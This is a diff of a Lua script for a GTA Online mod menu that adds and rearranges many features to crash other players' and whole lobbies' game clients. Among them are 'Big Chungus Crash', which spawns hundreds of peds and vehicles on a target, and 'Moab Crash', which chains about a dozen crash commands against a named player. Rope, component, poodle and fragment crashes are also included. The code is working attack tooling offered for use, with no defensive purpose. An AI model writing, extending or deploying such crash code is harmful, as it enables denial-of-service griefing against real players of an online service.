+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
+    
+            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
+            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
+            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
+            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
+    
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
+            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
+            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
+            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
+        end
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
+        entities.delete_by_handle(mdl)
+        entities.delete_by_handle(mdl2)
+        entities.delete_by_handle(mdl3)
+        entities.delete_by_handle(mdl4)
+        entities.delete_by_handle(veh_mdl)
+        entities.delete_by_handle(veh_mdl2)
+        util.yield(1000)
+    end)
+
+menu.toggle(lobbycrash, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
+if on_toggle then
+    menu.trigger_commands("tploopon" .. players.get_name(pid))
+    menu.trigger_commands("anticrashcamera On")
+    menu.trigger_commands("invisibility On")
+    menu.trigger_commands("levitate On")
+    menu.trigger_commands("potatomode On")
+    menu.trigger_commands("nosky On")
+    menu.trigger_commands("reducedcollision On")
+    menu.trigger_commands("nocollision On")
+    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
+    local mdl = util.joaat("A_C_Cat_01")
+    local mdl2 = util.joaat("U_M_Y_Zombie_01")
+    local mdl3 = util.joaat("A_F_M_ProlHost_01")
+    local mdl4 = util.joaat("A_M_M_SouCent_01")
+    local veh_mdl = util.joaat("insurgent2")
+    local veh_mdl2 = util.joaat("brawler")
+    util.request_model(veh_mdl)
+    util.request_model(veh_mdl2)
+    util.request_model(mdl)
+    util.request_model(mdl2)
+    util.request_model(mdl3)
+    util.request_model(mdl4)
+    for i = 1, 250 do
+        local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
+        local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
+        local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
+        local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
+        local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
+        local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
+        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+
+        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+
+        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+
+        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+
+        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
+        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
+
+        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
+        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
+
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+
+        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
+
+        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
+
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+        util.yield(100)
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+
+        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
+        
+        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
+
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
+
+        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
+        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
+        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
+        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
+
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
+        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
+        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
+        ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
+        ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
+        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
+    end
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
+    entities.delete_by_handle(mdl)
+    entities.delete_by_handle(mdl2)
+    entities.delete_by_handle(mdl3)
+    entities.delete_by_handle(mdl4)
+    entities.delete_by_handle(veh_mdl)
+    entities.delete_by_handle(veh_mdl2)
+    util.yield(1000)
+else
+    menu.trigger_commands("tploopon" .. players.get_name(pid))
+    util.yield(100)
+    menu.trigger_commands("anticrashcamera Off")
+    menu.trigger_commands("tpmazehelipad")
+    menu.trigger_commands("invisibility Off")
+    menu.trigger_commands("levitate Off")
+    menu.trigger_commands("potatomode Off")
+    menu.trigger_commands("nosky Off")
+    menu.trigger_commands("reducedcollision Off")
+    menu.trigger_commands("nocollision Off")
+    end
+end)
+
+menu.toggle_loop(lobbycrash, "Moab Crash", {"togglemoab"}, "WARNING! Toggle Panic Mode! DO NOT SPECTATE!.", function(on_toggle)
+    if on_toggle then
+        menu.trigger_commands("badnet" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("tpallentities" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("rainpeds" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("rainveh" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("ptfxclown" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
+            util.yield(5000)
+        menu.trigger_commands("chaosyeet" .. players.get_name(pid))
+        menu.trigger_commands("blackholeoffset" .. players.get_name(pid) .. " 0")
+            util.yield(5000)
+        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
+        menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 45")
+        menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
+        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
+                util.yield(5000)
+        menu.trigger_commands("plaguecrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+        menu.trigger_commands("ropecrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+        menu.trigger_commands("toggleweedcrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+        menu.trigger_commands("togglemath"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+        menu.trigger_commands("togglefragv3"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+        menu.trigger_commands("poodlev2"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(5000)
+    else
+        menu.trigger_commands("badnet" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("tpallentities" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("rainpeds" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("rainveh" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("ptfxclown" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("chaosyeet" .. players.get_name(pid))
+            util.yield(100)
+        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("plaguecrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("ropecrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("toggleweedcrash"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("togglemath"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("togglefragv3"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        menu.trigger_commands("poodlev2"..PLAYER.GET_PLAYER_NAME(pid))
+            util.yield(100)
+        end
+end)
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 	lagwithss = menu.list(newcrash, "Lag With Shit", {}, "", function(); end)
 
     
 menu.toggle_loop(lagwithss, "Lag With Armytrailer2", {"lagwitharmytrailer2"}, "", function()
+    notification("Lag With Armytrailer2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
     local playerpos = ENTITY.GET_ENTITY_COORDS(id)
     playerpos.z = playerpos.z + 3
@@ -8282,6 +8580,7 @@ end)
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	local dont_stop = false
 	menu.toggle_loop(newcrash,"Vehicle Chaos", {"chaosyeet"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
+        notification("Vehicle Chaos sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
 		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
 			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
 			local locspeed2 = speed
@@ -8344,9 +8643,10 @@ end)
 		end
 	end)
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-    	local keramicrash = menu.list(crash, "Kerami Crashes", {}, "")
+    	local keramicrash = menu.list(lobbycrash, "Kerami Crashes", {}, "")
 
 menu.toggle_loop(keramicrash, "Bad Net Crash", {"badnet"}, "Skidded from kerami script.", function(on_toggle)
+    notification("Badnet Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
     local vehicles = {}
     for i = 1, 4 do
@@ -8385,6 +8685,7 @@ menu.toggle_loop(keramicrash, "Bad Net Crash", {"badnet"}, "Skidded from kerami 
 	end)
 
 menu.toggle_loop(keramicrash, "Plague Crash Player", {"plaguecrash"}, "", function(on_loop)
+    notification("Plague Crash Player sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     for i = 1, 10 do
         local cord = getEntityCoords(getPlayerPed(pid))
         request_model(-930879665)
@@ -8418,6 +8719,7 @@ menu.toggle_loop(keramicrash, "Plague Crash Player", {"plaguecrash"}, "", functi
 end)
 
 menu.toggle_loop(keramicrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on_loop)
+    notification("Rope Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     PHYSICS.ROPE_LOAD_TEXTURES()
     local hashes = {2132890591, 2727244247}
     local pc = getEntityCoords(getPlayerPed(pid))
@@ -8466,7 +8768,8 @@ menu.toggle_loop(keramicrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on
         util.toast("Finished.")
     end)
 
-    menu.toggle_loop(weedcrash, "Weed Pot Crash", {"weedcrash"}, "", function(on_toggle)
+    menu.toggle_loop(weedcrash, "Weed Pot Crash", {"toggleweedcrash"}, "", function(on_toggle)
+        notification("Weed Pot Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
         local cord = getEntityCoords(getPlayerPed(pid))
         local a1 = entities.create_object(-930879665, cord)
         local a2 = entities.create_object(3613262246, cord)
@@ -8493,9 +8796,10 @@ menu.toggle_loop(keramicrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on
         end
     end)
 
-    local mathcrash = menu.list(crash, "Math Crash", {}, "")
+    local mathcrash = menu.list(lobbycrash, "Math Crash", {}, "")
 
 menu.action(mathcrash, "Math Crash Lobby", {"math"}, "One of the versions of rope crash.", function()
+    notification("Math Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     pos.x = pos.x+5
@@ -8510,6 +8814,7 @@ menu.action(mathcrash, "Math Crash Lobby", {"math"}, "One of the versions of rop
 end)
 
 menu.toggle_loop(mathcrash, "Math Crash Lobby", {"togglemath"}, "One of the versions of rope crash.", function(on_toggle)
+    notification("Math Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
     local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
     pos.x = pos.x+5
@@ -8526,7 +8831,68 @@ end)
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-local clothescrash = menu.list(crash, "Component Crash", {}, "")
+local clothescrash = menu.list(lobbycrash, "Component Crash", {}, "")
+
+menu.toggle_loop(clothescrash, "Small Component Crash", {"smallclothescrash"}, "Warning! Toggle Panic Mode First!", function(on_toggle)
+    notification("Small Component Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+        local math_random = math.random
+        local joaat = util.joaat
+        util.yield(100)
+        local pedhash = util.joaat("P_franklin_02")
+        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
+            STREAMING.REQUEST_MODEL(pedhash)
+            util.yield(10)
+        end
+        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
+        SpawnedPeds1 = {}
+        local ped_amount = math_random(7, 10)
+        for i = 1, ped_amount do
+            local pedtype = 0
+            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
+            local coords = PlayerPedCoords
+            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
+            coords.x = coords.x
+            coords.y = coords.y
+            coords.z = coords.z
+            if loc1 == 1 then
+                coords.x = coords.x - math_random(1, 5)
+            else
+                coords.x = coords.x + math_random(1, 5)
+            end
+            if loc2 == 1 then
+                coords.y = coords.y - math_random(1, 5)
+            else
+                coords.y = coords.y + math_random(1, 5)
+            end
+            if loc3 == 1 then
+                coords.z = coords.z - math_random(3, 5)
+            else
+                coords.z = coords.z + math_random(3, 5)
+            end
+            if pedt == 1 then
+                pedtype = 0
+            else
+                pedtype = 3
+            end
+            SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
+            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
+            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
+            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
+            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
+            util.yield(5)
+        end
+        for i = 1, ped_amount do
+            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
+            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
+            util.yield()
+        end
+        util.yield(500)
+        for i = 1, ped_amount do
+            entities.delete(SpawnedPeds1[i])
+            util.yield(5)
+            end
+    end)
 
 menu.action(clothescrash, "Component Crash", {"clothescrash"}, "Warning! Toggle Panic Mode First!", function()
         if pid ~= players.user() then
@@ -10715,9 +11081,6 @@ menu.toggle_loop(clothescrash, "Component Crash", {"toggleclothescrash"}, "Warni
     end
 end)
 
-
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 local poodlecrash = menu.list(crash, "Poodle Bomb Crash", {}, "")
@@ -10774,7 +11137,8 @@ notification("Worth it HAHA!!!", colors.red)
     end)
 end)
 
-    menu.toggle_loop(poodlecrash, "Poodle Crash V3", {"poodlev2"}, "Skidded from Jinx then x6 by Candy.", function(on_loop)
+    menu.toggle_loop(poodlecrash, "Poodle Crash V2", {"poodlev2"}, "Skidded from Jinx then x6 by Candy.", function(on_loop)
+        notification("Poodle Crash V2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
 --Locals
         local mdl = util.joaat('a_c_poodle')
         local mdl1 = util.joaat('a_c_poodle')
@@ -10928,8 +11292,8 @@ menu.toggle_loop(fragcrash, "Fragment Crash V2", {"togglefragv2"}, "", function(
 end
 end)
 
-
 menu.toggle(fragcrash, "Fragment Crash V3", {"togglefragv3"}, "", function(on_toggle)
+    notification("Fragment Crash V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
 if on_toggle then
         menu.trigger_commands("togglefragv1" .. players.get_name(pid))
         menu.trigger_commands("togglefragv2" .. players.get_name(pid))
@@ -10998,112 +11362,6 @@ notification("Sending 2take1 Special to " .. PLAYER.GET_PLAYER_NAME(pids), color
     end)
 end)
 
-local allin1crash = menu.list(crash, "All in1 Crash", {}, "")
-
-    menu.action(allin1crash, "All in1 Crash", {"allin1"}, "Sends a choke, flashcrash, 2t1spec, frag, poodle, pow, skidpow, doge, bozocrash, automob, error, notifyspam, casinotp, mission, ring, cage mugloop and explode all at once. Uses 50 Script different events and other methods.", function()
-    notification("All in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
-    util.yield(1000)
-menu.trigger_commands("automob"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("togglefragv1"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("bozocrash"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("pow"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("clothescrash"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("skidpow"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-              menu.trigger_commands("choke" .. players.get_name(pid))
-    util.yield(1000)
-              menu.trigger_commands("flashcrash" .. players.get_name(pid))
-    util.yield(1000)
-              menu.trigger_commands("steamroll" .. players.get_name(pid))
-    util.yield(1000)
-menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("doge"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("notifyspam"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("casinotp"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("mission"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("error"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("ring"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("cage"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("mugloop"..PLAYER.GET_PLAYER_NAME(pid))
-    notification("Finished All in1 Crash On " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            end)
-
-
-    menu.toggle_loop(allin1crash, "All in1 Crash", {"toggleallin1"}, "Sends a choke, flashcrash, 2t1spec, frag, poodle, pow, skidpow, bozocrash and doge all at once. Uses 50 Script different events and other methods looped.", function(on_toggle)
-    notification("All in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
-menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
-menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("automob"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("togglefragv3"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("bozocrash"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("pow"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("skidpow"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("doge"..PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-              menu.trigger_commands("choke" .. players.get_name(pid))
-    util.yield(1000)
-              menu.trigger_commands("flashcrash" .. players.get_name(pid))
-    util.yield(1000)
-              menu.trigger_commands("steamroll" .. players.get_name(pid))
-    util.yield(1000)
-menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
-    util.yield(1000)
-    notification("Finished All in1 Crash On " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            end)
-
-local ncrash = menu.list(crash, "3 in 1 Crash", {}, "")
-
-    menu.action(ncrash, "3 in 1 Crash", {"3in1"}, "Sends stands elegant, next-gen, burger king foot lettuce and vehicle manslaughter all at once", function(state)
-    notification("3in1 Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
